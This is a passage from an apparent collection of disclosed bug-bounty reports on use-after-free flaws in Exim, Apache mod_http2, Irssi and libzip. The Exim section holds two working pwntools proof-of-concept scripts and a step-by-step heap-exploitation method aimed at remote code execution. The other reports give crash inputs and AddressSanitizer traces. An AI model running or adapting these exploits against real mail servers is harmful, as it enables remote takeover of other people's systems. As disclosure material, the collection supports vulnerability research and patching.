This store makes `    if (!store_extend(next->text, oldsize, header_size))` in `receive_msg` failed when next extension occurs and then triggers use-after-free.

### Exploitation
The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to `0xdeadbeef`. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when **dkim** is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.
```python
# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
from pwn import *

r = remote('127.0.0.1', 25)

r.recvline()
r.sendline("EHLO test")
r.recvuntil("250 HELP")
r.sendline("MAIL FROM:<meh@some.domain>")
r.recvline()
r.sendline("RCPT TO:<meh@some.domain>")
r.recvline()
r.sendline('a'*0x1250+'\x7f')
r.recvuntil('command')
r.sendline('BDAT 1')
r.sendline(':BDAT \x7f')
s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)
r.send(s+ ':\r\n')
r.recvuntil('command')
r.send('\n')

r.interactive()
```

1. Running out of `current_block`
    In order to achieve code execution, we need to make the `next->text` get the first store of a block. That is, running out of `current_block` and making `store_get` allocate a new block. Therefore, we send a long message `'a'*0x1250+'\x7f'` with an unprintable character to cut `current_block`, making `yield_length` less than 0x100.
![](https://i.imgur.com/PaQWaAT.png)

2. Starts BDAT data transfer
    After that, we send BDAT command to start data transfer. At the beginning, `next` and `next->text` are allocated by `store_get`. 
    ![](https://i.imgur.com/C9PPhPY.png)
    The function `dkim_exim_verify_init` is called sequentially and it also calls `store_get`. Notice that this function uses **ANOTHER `store_pool`**, so it allocates from heap without changing `current_block` which `next->text` also points to.
[receive.c: 1734 receive_msg](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734)
    ```c
    if (smtp_input && !smtp_batched_input && !dkim_disable_verify)
      dkim_exim_verify_init(chunking_state <= CHUNKING_OFFERED);
    ```

3. Call `store_getc` inside `bdat_getc`
    Then, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the `current_block` with `store_get` in `string_printing`. 
![](https://i.imgur.com/5M1q0c4.png)

4. Keep sending msg until extension and bug triggered
    In this way, while we keep sending huge messages, `current_block` gets freed after the extension. In the malloc.c of glibc (so called ptmalloc), system manages a linked list of freed memory chunks, which is called unsortbin. Freed chunks are put into unsortbin if it is not the last chunk on the heap. In step 2, `dkim_exim_verify_init` allocated chunks after `next->text`. Therefore, this chunk is put into unsortbin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly `current_block->next`, and therefore `current_block->next` is overwritten to `unsortbin` inside `main_arena` of libc (linked list pointer `fd` points back to `unsortbin` if no other freed chunk exists). 
![](https://i.imgur.com/xdGViKJ.png)

5. Keep sending msg for the next extension
    When the next extension occurs, `store_get` tries to cut from `main_arena`, which makes attackers able to overwrite all global variables below main_arena. 
6. Overwrite global variables in libc
7. Finish sending message and trigger `free()`
    In the PoC, we simply modified `__free_hook` and ended the line. Exim calls `store_reset` to reset the buffer and calls `__free_hook` in `free()`. At this stage, we successfully controlled instruction pointer `$rip`.
    However, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both `__free_hook` and `_IO_2_1_stdout_`. We forged the vtable of `stdout` and set `__free_hook` to any call of `fflush(stdout)` inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both `$rip` and the content of first argument. 
    We consulted past CVE exploits and decided to call `expand_string`, which executes command with `execv` if we set the first argument to `${run{cmd}}`, and finally we got our RCE. 
    ![](https://i.imgur.com/2EkljvM.png)


#### Exploit for default configured exim
When dkim is disabled, the PoC above fails because `current_block` is the last chunk on heap. This makes the system merge it into a big chunk called **top chunk** rather than unsortbin.
The illustrations below describe the difference of heap layout:
![](https://i.imgur.com/RQ9LVOb.png)
![](https://i.imgur.com/X29oSsT.png)

To avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.

After running out of `current_block`:
1. Use DATA command to send lots of data
    Send huge data, make the chunk big and extend many times. After several extension, it calls `store_get` to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsortbin.
2. End DATA transfer and start a new email
    Restart to send an email with BDAT command after the heap chunk is prepared.
3. Adjust `yield_length` again
    Send invalid command with an unprintable charater again to cut the `current_block`.

Finally the heap layout is like:
![](https://i.imgur.com/b4phS3c.png)

And now we can go back to the step 2 at the beginning and create the same situation. When `next->text` is freed, it goes back to unsortbin and we are able to overwrite libc global variables again.
The following is the PoC for default configured exim:
```python
# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
from pwn import *

r = remote('localhost', 25)

r.recvline()
r.sendline("EHLO test")
r.recvuntil("250 HELP")
r.sendline("MAIL FROM:<>")
r.recvline()
r.sendline("RCPT TO:<meh@some.domain>")
r.recvline()
r.sendline('a'*0x1280+'\x7f')
r.recvuntil('command')
r.sendline('DATA')
r.recvuntil('itself\r\n')
r.sendline('b'*0x4000+':\r\n')
r.sendline('.\r\n')
r.sendline('.\r\n')
r.recvline()
r.sendline("MAIL FROM:<>")
r.recvline()
r.sendline("RCPT TO:<meh@some.domain>")
r.recvline()
r.sendline('a'*0x3480+'\x7f')
r.recvuntil('command')
r.sendline('BDAT 1')
r.sendline(':BDAT \x7f')
s = 'a'*6 + p64(0xdeadbeef)*(0x1e00/8)
r.send(s+ ':\r\n')
r.send('\n')
r.interactive()
```

A demo of our exploit is as below.
![](https://i.imgur.com/jumGJMG.png)
Note that we have not found a way to leak memory address and therefore we use heap spray instead. It requires another information leakage vulnerability to overcome the PIE mitigation on x86-64.

## Impact

Remote code execution on remote mail server, affecting over 500k mail servers.

---

### [mod_http2, memory corruption on early pushes (CVE-2019-10081)](https://hackerone.com/reports/677557)

- **Report ID:** `677557`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** Internet Bug Bounty
- **Reporter:** @cy1337
- **Bounty:** - usd
- **Disclosed:** 2019-10-15T18:00:26.476Z
- **CVE(s):** CVE-2019-10081

**Vulnerability Information:**

HTTP/2 very early pushes, for example configured with `H2PushResource`, could lead to an overwrite of memory in the pushing request's pool, leading to crashes. The memory copied is that of the configured push link header values, not data supplied by the client. Scenarios where an attacker may be able to influence response header values could potentially lead to controlled code execution. (Code execution has not been demonstrated and is unlikely with the config included here.) This issue affects versions 2.4.20 through 2.4.39.

This CVE is noted on the [Apache HTTPD advisory list](https://httpd.apache.org/security/vulnerabilities_24.html) as of August 14, 2019.

Reproduction is possible under ASAN builds of HTTPD with `MaxMemFree 1` and `H2Push On`

The following supplement to the default configuration is used:
```
Protocols h2c http/1.1
MaxMemFree 1
H2Push On
H2EarlyHints On
H2MaxSessionStreams 65535
H2WindowSize 65535
H2MinWorkers 5
H2MaxWorkers 32
H2MaxWorkerIdleSeconds 3
H2StreamMaxMemSize 1024
H2SerializeHeaders on
H2CopyFiles on
H2Padding 7
<Location />
    Header add Link "</xxx.css>;rel=preload"
    Header add Link "</xxx.js>;rel=preload"
    H2PushResource /xxx2.css
    H2PushResource /xxx3.css
    H2PushResource /
</Location> 
```

Under this configuration, the UAF is easily observed when handling traffic from [http2fuzz](https://github.com/c0nrad/http2fuzz). The behavior is affected by the size of responses and frequency of requests.

ASAN reports for these crashes are interesting because the faulting address tends to be an ASCII string. 

Here is a report where it manifested as a SEGV on an address which is actually an ASCII string (`0x44415445 == "DATE"`):
```
=================================================================
==7224==ERROR: AddressSanitizer: SEGV on unknown address 0x000044415445 (pc 0x00000068a8a3 bp 0x7fd8cf572a30 sp 0x7fd8cf5728d0 T1021)
    #0 0x68a8a2 in ap_http_filter /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http/http_filters.c:497
    #1 0x464232 in ap_get_brigade /home/cyoung/http2_fuzz/httpd-2.4.39/server/util_filter.c:553
    #2 0x696781 in ap_discard_request_body /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http/http_filters.c:1637
    #3 0x47f9d5 in ap_finalize_request_protocol /home/cyoung/http2_fuzz/httpd-2.4.39/server/protocol.c:1589
    #4 0x67d037 in ap_die_r /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http/http_request.c:82
    #5 0x680ad3 in ap_process_async_request /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http/http_request.c:476
    #6 0x680bc0 in ap_process_request /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http/http_request.c:488
    #7 0x67648d in ap_process_http_sync_connection /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http/http_core.c:210
    #8 0x676702 in ap_process_http_connection /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http/http_core.c:251
    #9 0x4f4c90 in ap_run_process_connection /home/cyoung/http2_fuzz/httpd-2.4.39/server/connection.c:42
    #10 0x8f488d in h2_task_do /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_task.c:615
    #11 0x904388 in slot_run /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_workers.c:231
    #12 0x7fdadd58b92d in dummy_worker threadproc/unix/thread.c:142
    #13 0x7fdadd0c36b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)
    #14 0x7fdadcdf941c in clone (/lib/x86_64-linux-gnu/libc.so.6+0x10741c)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http/http_filters.c:497 ap_http_filter
Thread T1021 created by T0 here:
    #0 0x7fdadeddb253 in pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x36253)
    #1 0x7fdadd58bbd7 in apr_thread_create threadproc/unix/thread.c:179
    #2 0x903a7e in activate_slot /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_workers.c:106
    #3 0x9051de in h2_workers_create /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_workers.c:358
    #4 0x8735fb in h2_conn_child_init /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_conn.c:136
    #5 0x86b62f in h2_child_init /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/mod_http2.c:186
    #6 0x4cff5c in ap_run_child_init /home/cyoung/http2_fuzz/httpd-2.4.39/server/config.c:166
    #7 0x9e104c in child_main /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:2502
    #8 0x9e1a61 in make_child /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:2691
    #9 0x9e38d7 in perform_idle_server_maintenance /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:2886
    #10 0x9e440a in server_main_loop /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:3015
    #11 0x9e4e1d in event_run /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:3092
    #12 0x45e3ad in ap_run_mpm /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm_common.c:94
    #13 0x445d2b in main /home/cyoung/http2_fuzz/httpd-2.4.39/server/main.c:819
    #14 0x7fdadcd1282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

==7224==ABORTING
```

And another trace shows `bPPUSP` as the fault address:
```
=================================================================
==16301==ERROR: AddressSanitizer: SEGV on unknown address 0x625050555350 (pc 0x7fb7144ffa1f bp 0x7fb4f3775530 sp 0x7fb4f3775500 T1058)
    #0 0x7fb7144ffa1e in apr_pool_cleanup_kill memory/unix/apr_pools.c:2553
    #1 0x907d6f in pool_kill /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_bucket_beam.c:491
    #2 0x90877a in beam_cleanup /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_bucket_beam.c:601
    #3 0x908965 in h2_beam_destroy /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_bucket_beam.c:622
    #4 0x8f352e in h2_task_destroy /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_task.c:530
    #5 0x889186 in stream_destroy_iter /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_mplx.c:310
    #6 0x8f9325 in ihash_iter /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_util.c:275
    #7 0x7fb7144db246 in apr_hash_do tables/apr_hash.c:542
    #8 0x8f9416 in h2_ihash_iter /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_util.c:283
    #9 0x88933f in purge_streams /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_mplx.c:328
    #10 0x899ac4 in h2_mplx_dispatch_master_events /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_mplx.c:1066
    #11 0x8c8ce8 in dispatch_master /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_session.c:2072
    #12 0x8ce130 in h2_session_process /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_session.c:2264
    #13 0x873b76 in h2_conn_run /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_conn.c:208
    #14 0x883731 in h2_h2_process_conn /home/cyoung/http2_fuzz/httpd-2.4.39/modules/http2/h2_h2.c:657
    #15 0x4f4c90 in ap_run_process_connection /home/cyoung/http2_fuzz/httpd-2.4.39/server/connection.c:42
    #16 0x9d7eed in process_socket /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:1050
    #17 0x9de808 in worker_thread /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:2083
    #18 0x7fb71452a92d in dummy_worker threadproc/unix/thread.c:142
    #19 0x7fb7140626b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)
    #20 0x7fb713d9841c in clone (/lib/x86_64-linux-gnu/libc.so.6+0x10741c)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV memory/unix/apr_pools.c:2553 apr_pool_cleanup_kill
Thread T1058 created by T1042 here:
    #0 0x7fb715d7a253 in pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x36253)
    #1 0x7fb71452abd7 in apr_thread_create threadproc/unix/thread.c:179
    #2 0x9dff5f in start_threads /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:2337
    #3 0x7fb71452a92d in dummy_worker threadproc/unix/thread.c:142
    #4 0x7fb7140626b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)

Thread T1042 created by T0 here:
    #0 0x7fb715d7a253 in pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x36253)
    #1 0x7fb71452abd7 in apr_thread_create threadproc/unix/thread.c:179
    #2 0x9e13e1 in child_main /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:2542
    #3 0x9e1ada in make_child /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:2691
    #4 0x9e3950 in perform_idle_server_maintenance /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:2886
    #5 0x9e4483 in server_main_loop /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:3015
    #6 0x9e4e96 in event_run /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm/event/event.c:3092
    #7 0x45e3ad in ap_run_mpm /home/cyoung/http2_fuzz/httpd-2.4.39/server/mpm_common.c:94
    #8 0x445d2b in main /home/cyoung/http2_fuzz/httpd-2.4.39/server/main.c:819
    #9 0x7fb713cb182f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

==16301==ABORTING
```

## Impact

At a minimum, a remote unauthenticated attacker can DoS the server. The maximum risk, code execution, would be highly context dependent since an attacker generally cannot control the values being written improperly.

---

### [CVE-2017-10966: Heap-use-after-free in Irssi <1.0.4](https://hackerone.com/reports/247028)

- **Report ID:** `247028`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-14T00:11:35.033Z
- **CVE(s):** CVE-2017-10966

**Vulnerability Information:**

35 days after reading https://irssi.org/2017/05/12/fuzzing-irssi/, I was able to trigger a heap-use-after-free in irssi 1.0.2.

Timeline:
Report to vendor: 16 June 2017
Acknowledge by vendor: 16 June 2017
Fixed by vendor: 7 July 2017

Advisory:
http://seclists.org/oss-sec/2017/q3/80

Patch:
https://github.com/irssi/irssi/commit/5e26325317c72a04c1610ad952974e206

```
./irssi < test001
CAP LS
NICK root
USER root root /dev/stdin :root
MODE  +i
WHOIS root
WHO +00000000000000000000o00

==30112==ERROR: AddressSanitizer: heap-use-after-free on address 0x607000008100 at pc 0x0000006d3a48 bp 0x7ffdd447b320 sp 0x7ffdd447b318
READ of size 8 at 0x607000008100 thread T0
    #0 0x6d3a47 in nicklist_remove_hash /root/irssi-1.0.2/src/core/nicklist.c:455:30
    #1 0x7f97420273bf in g_hash_table_foreach (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x393bf)
    #2 0x6d3786 in sig_channel_destroyed /root/irssi-1.0.2/src/core/nicklist.c:465:2
    #3 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3
    #4 0x6f4207 in signal_emit /root/irssi-1.0.2/src/core/signals.c:286:3
    #5 0x699ec1 in channel_destroy /root/irssi-1.0.2/src/core/channels.c:83:2
    #6 0x672ce0 in event_join /root/irssi-1.0.2/src/irc/core/channel-events.c:258:3
    #7 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3
    #8 0x6f4207 in signal_emit /root/irssi-1.0.2/src/core/signals.c:286:3
    #9 0x62cd3d in irc_server_event /root/irssi-1.0.2/src/irc/core/irc.c:308:7
    #10 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3
    #11 0x6f59b6 in signal_emit_id /root/irssi-1.0.2/src/core/signals.c:304:3
    #12 0x62d33a in irc_parse_incoming_line /root/irssi-1.0.2/src/irc/core/irc.c:362:3
    #13 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3
    #14 0x6f59b6 in signal_emit_id /root/irssi-1.0.2/src/core/signals.c:304:3
    #15 0x62d6ba in irc_parse_incoming /root/irssi-1.0.2/src/irc/core/irc.c:383:3
    #16 0x6bb9b2 in irssi_io_invoke /root/irssi-1.0.2/src/core/misc.c:55:3
    #17 0x7f9742038229 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a229)
    #18 0x7f97420385df  (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a5df)
    #19 0x7f974203868b in g_main_context_iteration (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a68b)
    #20 0x57e4a7 in main /root/irssi-1.0.2/src/fe-text/irssi.c:326:3
    #21 0x7f97408273f0 in __libc_start_main /build/glibc-cxyGtm/glibc-2.24/csu/../csu/libc-start.c:291
    #22 0x42e979 in _start (/root/irssi-1.0.2/src/fe-text/irssi+0x42e979)

0x607000008100 is located 64 bytes inside of 72-byte region [0x6070000080c0,0x607000008108)
freed by thread T0 here:
    #0 0x4e4170 in __interceptor_cfree.localalias.1 (/root/irssi-1.0.2/src/fe-text/irssi+0x4e4170)
    #1 0x6d39eb in nicklist_destroy /root/irssi-1.0.2/src/core/nicklist.c:112:2
    #2 0x6d39eb in nicklist_remove_hash /root/irssi-1.0.2/src/core/nicklist.c:456

previously allocated by thread T0 here:
    #0 0x4e4520 in calloc (/root/irssi-1.0.2/src/fe-text/irssi+0x4e4520)
    #1 0x7f974203d9e0 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4f9e0)

SUMMARY: AddressSanitizer: heap-use-after-free /root/irssi-1.0.2/src/core/nicklist.c:455:30 in nicklist_remove_hash
```

---

### [CVE-2017-12858: Heap UAF in _zip_buffer_free() / Double free in _zip_dirent_read()](https://hackerone.com/reports/260414)

- **Report ID:** `260414`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** Internet Bug Bounty
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T20:32:46.646Z
- **CVE(s):** CVE-2017-12858

**Vulnerability Information:**

libzip is a C library for reading, creating, and modifying zip archives. A partial list of projects using libzip include: [Plex Home Theater](https://support.plex.tv/hc/en-us/articles/204096476-License-Information), MySQL Workbench, ckmame, fuse-zip, lua-zip, **php zip extension**, zipruby, Endeavour2, FreeDink, DeaDBeeF (vfs_zip plugin), OpenLierox, ebook-tools, PDF Expert, ReaddleDocs, simple basic C++ wrapper for libzip, libzip++ - safe and modern c++14 wrapper around libzip, **Adobe (e.g., in Edge)**, PureBasic (ZipPacker), freebasic (ExtLibZip), Mercedes (S-Class), Kerkythea, G3D Innovation Engine, D'Fusion Studio, odt2tex - Libre/OpenOffice to LaTeX converter, *Kobo eReader*, Kchmviewer, **Yubikey NEO CCID Manager C Library**, **Veracrypt**, InstantZip, OpenRCT2 (RollerCoaster Tycoon 2 re-implementation)

- Reported to the vendor on 9 June 2017 via email.
- [Fixed in their master code on 14 August 2017](https://github.com/nih-at/libzip/commit/2217022b7d1142738656d891e00b3d2d9179b796#diff-df71eca2e47a996fe7a792832da8745c). 
- Vendor states it was a 'Double Free' in zip_dirent.c.
- CVE requested on 14 August 2017.
- CVE-2017-12858 assigned on 15 August 2017.


```
==19825==ERROR: AddressSanitizer: heap-use-after-free on address 0x60300000ece1 at pc 0x0000004fbbe9 bp 0x7ffd4ed8f250 sp 0x7ffd4ed8f248
READ of size 1 at 0x60300000ece1 thread T0
    #0 0x4fbbe8 in _zip_buffer_free /root/libzip/lib/zip_buffer.c:53:9
    #1 0x4ccdc5 in _zip_dirent_read /root/libzip/lib/zip_dirent.c:477:17
    #2 0x4dd766 in _zip_checkcons /root/libzip/lib/zip_open.c:469:6
    #3 0x4dc511 in _zip_find_central_dir /root/libzip/lib/zip_open.c:612:28
    #4 0x4dc511 in _zip_open /root/libzip/lib/zip_open.c:194
    #5 0x4da5d7 in zip_open_from_source /root/libzip/lib/zip_open.c:148:11
    #6 0x4d9a10 in zip_open /root/libzip/lib/zip_open.c:74:15
    #7 0x4bfa32 in list_zip /root/libzip/src/zipcmp.c:396:13
    #8 0x4bfa32 in compare_zip /root/libzip/src/zipcmp.c:225
    #9 0x4bfa32 in main /root/libzip/src/zipcmp.c:193
    #10 0x7fab6f292b44 in __libc_start_main /build/glibc-KShDyh/glibc-2.19/csu/libc-start.c:287
    #11 0x4bf29c in _start (/root/libzip/src/zipcmp+0x4bf29c)

0x60300000ece1 is located 1 bytes inside of 32-byte region [0x60300000ece0,0x60300000ed00)
freed by thread T0 here:
    #0 0x4a199b in free (/root/libzip/src/zipcmp+0x4a199b)
    #1 0x4fbbc0 in _zip_buffer_free /root/libzip/lib/zip_buffer.c:57:5
    #2 0x4dd766 in _zip_checkcons /root/libzip/lib/zip_open.c:469:6
    #3 0x4dc511 in _zip_find_central_dir /root/libzip/lib/zip_open.c:612:28
    #4 0x4dc511 in _zip_open /root/libzip/lib/zip_open.c:194
    #5 0x4da5d7 in zip_open_from_source /root/libzip/lib/zip_open.c:148:11
    #6 0x4d9a10 in zip_open /root/libzip/lib/zip_open.c:74:15
    #7 0x4bfa32 in list_zip /root/libzip/src/zipcmp.c:396:13
    #8 0x4bfa32 in compare_zip /root/libzip/src/zipcmp.c:225
    #9 0x4bfa32 in main /root/libzip/src/zipcmp.c:193
    #10 0x7fab6f292b44 in __libc_start_main /build/glibc-KShDyh/glibc-2.19/csu/libc-start.c:287

previously allocated by thread T0 here:
    #0 0x4a1c1b in __interceptor_malloc (/root/libzip/src/zipcmp+0x4a1c1b)
    #1 0x4fd07b in _zip_buffer_new /root/libzip/lib/zip_buffer.c:168:35
    #2 0x4fd07b in _zip_buffer_new_from_source /root/libzip/lib/zip_buffer.c:190
    #3 0x514487 in _fini (/root/libzip/src/zipcmp+0x514487)

SUMMARY: AddressSanitizer: heap-use-after-free /root/libzip/lib/zip_buffer.c:53 _zip_buffer_free
```

---
